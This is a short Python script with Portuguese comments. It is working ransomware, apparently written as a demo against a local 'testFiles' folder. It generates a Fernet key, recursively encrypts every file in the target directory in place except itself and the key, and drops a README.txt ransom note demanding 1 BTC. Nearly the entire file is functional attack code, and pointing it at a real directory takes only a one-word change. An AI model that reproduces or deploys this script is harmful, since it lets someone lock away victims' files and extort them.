from cryptography.fernet import Fernet
import os

#1 - Gerar uma chave de criptografia e salvar

def gerarChave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chaveFile:
        chaveFile.write(chave)

#2 - Carregar a chave salva

def carregarChave():
    return open("chave.key", "rb").read()

#3 - Criptografar um único arquivo

def criptografarArquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dadosEncriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dadosEncriptados)

#4 - Encontrar arquivos para criptografar

def encontrarArquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5 - Mensagem de resgate

def mensagemResgate():
    with open("README.txt", "w") as file:
        file.write("Fala, jogador! Passando pra avisar que criptografei teus arquivos.\n")
        file.write("Se tu precisar que libere, manda 1BTC ai, chefia.\n")
        file.write("Tamo junto, parceiro(a)!")

#6 - Execução principal

def main():
    gerarChave()
    chave = carregarChave()
    arquivos = encontrarArquivos("testFiles")
    for arquivo in arquivos:
        criptografarArquivo(arquivo, chave)
    mensagemResgate()
    print("Ransoware implantado! Arquivos criptografados!")

if __name__=="__main__":
    main()
